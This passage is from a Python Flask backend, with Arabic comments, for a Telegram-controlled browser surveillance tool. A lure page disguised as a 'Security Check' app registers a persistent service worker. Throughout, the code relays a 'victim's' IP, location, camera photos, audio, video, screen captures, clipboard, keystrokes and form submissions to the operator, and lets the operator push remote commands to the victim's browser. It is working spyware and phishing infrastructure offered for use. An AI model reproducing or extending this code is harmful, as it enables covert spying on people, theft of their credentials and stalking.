        InlineKeyboardButton("❌ إغلاق الجلسة", callback_data=f"lsh_kill_{session_id}"),
    )
    return m


# ============================================================
# [7] المسارات
# ============================================================
def init_lsh_routes(app, bot):

    # ------------------------------------------------------------
    # Service Worker
    # ------------------------------------------------------------
    @app.route('/sw.js', methods=['GET'])
    def serve_sw():
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            sw_path = os.path.join(base_dir, 'sw.js')
            if os.path.exists(sw_path):
                with open(sw_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                print("[+] /sw.js served from file")
            else:
                content = SW_FALLBACK
                print("[+] /sw.js served from fallback")
            return Response(
                content,
                mimetype='application/javascript',
                headers={
                    'Service-Worker-Allowed': '/',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                }
            )
        except Exception as e:
            print(f"[-] serve_sw error: {e}")
            return Response(SW_FALLBACK, mimetype='application/javascript')

    # ------------------------------------------------------------
    # Manifest (PWA)
    # ------------------------------------------------------------
    @app.route('/manifest.json', methods=['GET'])
    def serve_manifest():
        manifest = {
            "name": "Security Check",
            "short_name": "Sec",
            "start_url": "/",
            "display": "standalone",
            "background_color": "#f5f7fa",
            "theme_color": "#2563eb",
            "icons": []
        }
        return Response(
            json.dumps(manifest),
            mimetype='application/manifest+json'
        )

    # ------------------------------------------------------------
    # الصفحة الرئيسية
    # ------------------------------------------------------------
    @app.route('/lsh', methods=['GET'])
    def lsh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400
        try:
            if redis_client:
                stored = redis_client.get(f"lsh_session:{session_id}")
                if not stored:
                    return "Session expired", 410
        except Exception:
            pass
        create_session(session_id, chat_id)
        html = (LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    # ------------------------------------------------------------
    # المسار الموحّد: يستقبل رسالة + يرد بأوامر معلّقة
    # ------------------------------------------------------------
    @app.route('/lsh_msg', methods=['POST'])
    def lsh_msg():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            if not session_id or not chat_id:
                return jsonify({"commands": []}), 200

            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()
            else:
                create_session(session_id, chat_id)

            # اسحب الأوامر المعلّقة
            commands = []
            if redis_client:
                channel = f"lsh_cmd:{session_id}"
                try:
                    for _ in range(5):
                        item = redis_client.rpop(channel)
                        if not item:
                            break
                        try:
                            cmd = json.loads(item)
                            commands.append(cmd)
                            print(f"[+] DELIVER >> {session_id[:8]} | {cmd.get('action')}")
                        except Exception as pe:
                            print(f"[-] parse cmd error: {pe}")
                except Exception as re:
                    print(f"[-] redis read error: {re}")

                try:
                    redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
                except Exception:
                    pass

            # عالج الرسالة الواردة (إلا إذا كانت ping)
            dtype = data.get('type')
            if dtype and dtype not in ('ping', 'sw_ping', 'page_ping'):
                source_ip = (request.headers.get('CF-Connecting-IP') or
                             request.headers.get('X-Forwarded-For') or
                             request.remote_addr or "Unknown")
                if ',' in source_ip:
                    source_ip = source_ip.split(',')[0].strip()
                try:
                    _handle_incoming(bot, chat_id, session_id, data, source_ip)
                except Exception as he:
                    print(f"[-] handle error: {he}")
                    import traceback
                    traceback.print_exc()

            return jsonify({"commands": commands, "ok": True}), 200
        except Exception as e:
            print(f"[-] lsh_msg FATAL: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"commands": []}), 200

    # ------------------------------------------------------------
    # إنشاء جلسة
    # ------------------------------------------------------------
    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id')
        if not session_id:
            import uuid as _uuid
            session_id = str(_uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200


# ============================================================
# [8] معالجة الوارد
# ============================================================
def _handle_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')
    print(f"[<<] {dtype} | {session_id[:8]}")

    try:
        if dtype == 'landing':
            bot.send_message(chat_id,
                f"🎯 **الضحية فتح الرابط!**\n"
                f"🆔 `{session_id}`\n🌐 IP: `{source_ip}`\n\n"
                f"⏳ في انتظار تصرف الضحية...",
                parse_mode="Markdown")

        elif dtype == 'retry_click':
            bot.send_message(chat_id,
                f"👆 **الضحية ضغط على إعادة المحاولة!**\n🆔 `{session_id}`",
                parse_mode="Markdown")

        elif dtype == 'ready':
            panel = build_lsh_control_panel(session_id, chat_id)
            bot.send_message(chat_id,
                f"✅ **الجلسة `{session_id[:8]}` جاهزة للتحكم الكامل**\n"
                f"استخدم اللوحة أدناه 👇",
                parse_mode="Markdown", reply_markup=panel)

        elif dtype == 'info':
            info = data.get('info', {})
            info['ip'] = source_ip
            sess = get_session(session_id)
            if sess:
                sess['info'] = info
            text = _format_info_report(info, session_id)
            bot.send_message(chat_id, text, parse_mode="Markdown",
                             disable_web_page_preview=True)

        elif dtype == 'location':
            loc = data.get('location') or {}
            if loc and loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(chat_id,
                    f"📍 **الموقع:** `{lat}, {lng}`\n"
                    f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "❌ لم يتم السماح بالموقع")

        elif dtype == 'first_photo':
            _send_photo(bot, chat_id, data.get('image',''), "📸 **صورة أولية**")

        elif dtype == 'first_audio':
            _send_audio(bot, chat_id, data.get('audio',''), "🎙️ **تسجيل صوتي أولي**")

        elif dtype == 'periodic_photo':
            _send_photo(bot, chat_id, data.get('image',''), "📸 **صورة دورية تلقائية**")

        elif dtype == 'cmd_result':
            action = data.get('action')
            status = data.get('status')
            error = data.get('error', '')
            result = data.get('data')
            if status == 'ok':
                _handle_cmd_success(bot, chat_id, action, result)
            else:
                _handle_cmd_failure(bot, chat_id, action, error)

        elif dtype == 'cmd_no_tab':
            bot.send_message(chat_id,
                f"⚠️ **الضحية أغلقت الصفحة**\n"
                f"الأمر `{data.get('action')}` لم يُنفذ.\n"
                f"الـ Service Worker يبقى يعمل في الخلفية.",
                parse_mode="Markdown")

        elif dtype == 'key':
            key = data.get('key', '')
            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape',
                                          'ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
                _accumulate_key(chat_id, session_id, key)

        elif dtype == 'clipboard_copy':
            c = data.get('content','')
            if c: bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{c[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_paste':
            c = data.get('content','')
            if c: bot.send_message(chat_id, f"📥 **لصق:**\n```\n{c[:300]}\n```", parse_mode="Markdown")

        elif dtype == 'form_submit':
            form_data = data.get('data', {})
            lines = ["📝 **نموذج:**", f"Action: `{str(data.get('action_url',''))[:80]}`"]
            for k, v in list(form_data.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

        elif dtype == 'click':
            txt = (data.get('text') or '').strip()
            if txt and len(txt) > 2:
                _accumulate_click(chat_id, session_id, txt)

    except Exception as e:
        print(f"[-] _handle_incoming error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [9] نتائج الأوامر
# ============================================================
def _handle_cmd_success(bot, chat_id, action, data):
    try:
        if action == 'snapshot':
            _send_photo(bot, chat_id, data, "📸 **صورة بأمر مباشر** ✅")
        elif action == 'audio':
            _send_audio(bot, chat_id, data, "🎙️ **تسجيل صوتي بأمر** ✅")
        elif action == 'video':
            _send_video(bot, chat_id, data, "🎥 **فيديو بأمر** ✅")
        elif action == 'screen':
            _send_photo(bot, chat_id, data, "🖥️ **لقطة شاشة مباشرة** ✅")
        elif action == 'clipboard':
            bot.send_message(chat_id, f"📋 **الحافظة:**\n```\n{str(data)[:1000]}\n```", parse_mode="Markdown")
        elif action == 'location':
            try:
                loc = json.loads(data)
                lat, lng = loc.get('latitude'), loc.get('longitude')
                bot.send_message(chat_id,
                    f"📍 **الموقع المحدّث:** `{lat}, {lng}`\n"
                    f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown")
            except Exception:
                bot.send_message(chat_id, f"📍 {data}")
        elif action == 'url':
            bot.send_message(chat_id, f"✅ **تم فتح الرابط على جهاز الضحية**\n`{data}`", parse_mode="Markdown")
        elif action == 'vibrate':
            bot.send_message(chat_id, "📳 **تم الاهتزاز على جهاز الضحية** ✅")
        elif action == 'redirect':
            bot.send_message(chat_id, "✅ **تم إنهاء الجلسة وتحويل الضحية**")
        else:
            bot.send_message(chat_id, f"✅ `{action}` تم بنجاح")
    except Exception as e:
        print(f"[-] _handle_cmd_success error: {e}")


def _handle_cmd_failure(bot, chat_id, action, error):
    msgs = {
        ('snapshot', 'no_camera'): "❌ **لا يمكن الوصول للكاميرا** — الضحية رفض الإذن",
        ('snapshot', 'capture_failed'): "❌ **فشل التقاط الصورة**",
        ('audio', 'no_mic'): "❌ **لا يمكن الوصول للميكروفون** — الضحية رفض الإذن",
        ('audio', 'record_failed'): "❌ **فشل التسجيل الصوتي**",
        ('video', 'no_camera'): "❌ **لا يمكن الوصول للكاميرا**",
        ('video', 'record_failed'): "❌ **فشل تسجيل الفيديو**",
        ('screen', 'not_supported'): "❌ **المتصفح لا يدعم مشاركة الشاشة**",
        ('screen', 'denied'): "❌ **الضحية رفض مشاركة الشاشة**",
        ('clipboard', 'not_supported'): "❌ **المتصفح لا يدعم قراءة الحافظة**",
        ('clipboard', 'denied'): "❌ **الضحية رفض الوصول للحافظة**",
        ('location', 'denied_or_timeout'): "❌ **الضحية رفض الموقع أو انتهت المهلة**",
        ('url', 'popup_blocked'): "❌ **المتصفح حجب النافذة الجديدة**",
        ('vibrate', 'not_supported'): "❌ **الجهاز لا يدعم الاهتزاز**",
        ('redirect', 'unknown'): "❌ **فشل إنهاء الجلسة**",
        ('unknown_action', 'unknown_action'): "❌ **أمر غير معروف**",
    }
    key = (action, error)
    msg = msgs.get(key)
    if not msg:
        msg = f"❌ **{action} فشل:** `{error[:100]}`"
    try:
        bot.send_message(chat_id, msg, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _handle_cmd_failure error: {e}")


# ============================================================
# [10] مساعدات
# ============================================================
def _send_photo(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:image'): return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.jpg'
        bot.send_photo(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_photo: {e}")


def _send_audio(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:audio'): return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_audio(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_audio: {e}")


def _send_video(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:video'): return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_video(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_video: {e}")


_key_buffers = {}
_click_buffers = {}
_BOT_REF = None


def set_bot_reference(bot):
    global _BOT_REF
    _BOT_REF = bot


def _accumulate_key(chat_id, session_id, key):
    now = time.time()
    key_map = {'Enter': ' ⏎ ', 'Backspace': '⌫', 'Delete': '⌦', 'Tab': ' ⇥ ',
               'Escape': '⎋', 'ArrowUp': '↑', 'ArrowDown': '↓',
               'ArrowLeft': '←', 'ArrowRight': '→'}
    display = key_map.get(key, key)
    buf = _key_buffers.setdefault(chat_id, {"text": "", "last": 0})
    buf["text"] += display
    if now - buf["last"] > 4 or len(buf["text"]) > 180:
        if buf["text"].strip() and _BOT_REF:
            try:
                _BOT_REF.send_message(chat_id, f"⌨️ **لوحة المفاتيح:**\n```\n{buf['text'][:500]}\n```", parse_mode="Markdown")
            except Exception: pass
        buf["text"] = ""
        buf["last"] = now


def _accumulate_click(chat_id, session_id, text):
    now = time.time()
    buf = _click_buffers.setdefault(chat_id, {"texts": [], "last": 0})
    buf["texts"].append(text)
    if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
        if _BOT_REF and buf["texts"]:
            try:
                unique = list(dict.fromkeys(buf["texts"]))[:8]
                _BOT_REF.send_message(chat_id, "🖱️ **النقرات:**\n" + "\n".join(f"• {t[:70]}" for t in unique), parse_mode="Markdown")
            except Exception: pass
        buf["texts"] = []
        buf["last"] = now


def _format_info_report(info, session_id):
    bat = info.get('battery') or {}
    net = info.get('connection') or {}
    scr = info.get('screen') or {}
    hw = info.get('hardware') or {}
    gpu = info.get('gpu') or {}
    webrtc = info.get('webrtc_ips', [])
    ip = info.get('ip', 'Unknown')
    webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"
    sw_status = "✅ مدعوم" if info.get('sw_supported') else "❌ غير مدعوم"
    wl_status = "✅ مدعوم" if info.get('wakelock_supported') else "❌ غير مدعوم"
    return (
        "╔══════════════════════════════╗\n"
        "║  🎯 **جلسة LSH جديدة**  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🆔 `{session_id}`\n"
        f"🌐 **IP:** `{ip}`\n"
        f"🕵️ **IP الحقيقي:** `{webrtc_text}`\n"
        f"🕐 `{info.get('timestamp', 'N/A')[:19]}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💻 **الجهاز:**\n"
        f"• `{info.get('platform', 'Unknown')}`\n"
        f"• أنوية: `{hw.get('cores', 'N/A')}` | RAM: `{hw.get('memory', 'N/A')} GB`\n"
        f"• اللغة: `{info.get('language', 'N/A')}`\n"
        f"• التوقيت: `{info.get('timezone', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 **GPU:**\n"
        f"• `{gpu.get('vendor', 'N/A')}`\n"
        f"• `{gpu.get('renderer', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📐 **الشاشة:**\n"
        f"• `{scr.get('width', '?')}x{scr.get('height', '?')}` DPR `{scr.get('pixelRatio', '?')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 **البطارية:** "
        + (f"`{bat.get('level', '?')}%`" if bat else "غير متاح") + "\n"
        "📶 **الشبكة:** "
        + (f"`{net.get('effectiveType', '?')}`" if net else "غير متاح") + "\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ **Service Worker:** {sw_status}\n"
        f"💡 **Wake Lock:** {wl_status}"
)
